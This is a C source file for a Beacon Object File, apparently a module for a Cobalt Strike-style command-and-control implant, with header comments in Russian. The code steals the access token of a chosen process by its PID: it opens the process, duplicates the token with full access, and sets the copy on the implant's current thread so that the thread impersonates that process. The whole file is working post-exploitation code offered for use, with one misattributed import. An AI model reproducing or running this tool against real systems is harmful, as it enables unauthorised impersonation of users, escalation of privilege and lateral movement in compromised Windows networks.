// bof_steal_token.c — кража токена процесса.
//
// Дублирует токен указанного процесса и устанавливает его для текущего
// потока beacon'а. Эквивалент команды `steal_token` но как BOF для
// демонстрации техники. Полезно когда нужен полный контроль над процессом
// кражи токена.

#include "..\bof_api.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpSecurityAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(VOID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$SetThreadToken(PHANDLE Thread, HANDLE Token);

#define PROCESS_QUERY_INFORMATION 0x0400

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int pid = BeaconDataInt(&parser);
    if (pid == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: bof bof_steal_token.x64.o <pid>\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Example: bof bof_steal_token.x64.o 1234\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[steal_token] Attempting to steal token from PID %d\n", pid);

    // Open target process
    HANDLE process = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (!process) {
        BeaconPrintf(CALLBACK_ERROR, "[steal_token] Failed to open process %d\n", pid);
        return;
    }

    // Open process token
    HANDLE token;
    if (!KERNEL32$OpenProcessToken(process, 0x0002 | 0x0008, &token)) {  // TOKEN_DUPLICATE | TOKEN_QUERY
        BeaconPrintf(CALLBACK_ERROR, "[steal_token] Failed to open process token\n");
        KERNEL32$CloseHandle(process);
        return;
    }

    // Duplicate token for impersonation
    HANDLE new_token;
    if (!ADVAPI32$DuplicateTokenEx(
            token,
            0xF01FF,  // TOKEN_ALL_ACCESS
            NULL,
            2,        // SecurityImpersonation
            2,        // TokenImpersonation
            &new_token)) {
        BeaconPrintf(CALLBACK_ERROR, "[steal_token] Failed to duplicate token\n");
        KERNEL32$CloseHandle(token);
        KERNEL32$CloseHandle(process);
        return;
    }

    // Set the token for current thread
    HANDLE current_thread = KERNEL32$GetCurrentThread();
    if (!ADVAPI32$SetThreadToken(&current_thread, new_token)) {
        BeaconPrintf(CALLBACK_ERROR, "[steal_token] Failed to set thread token\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[steal_token] Successfully stole token from PID %d\n", pid);
        BeaconPrintf(CALLBACK_OUTPUT, "[steal_token] Current thread is now impersonating target process\n");
    }

    KERNEL32$CloseHandle(new_token);
    KERNEL32$CloseHandle(token);
    KERNEL32$CloseHandle(process);
}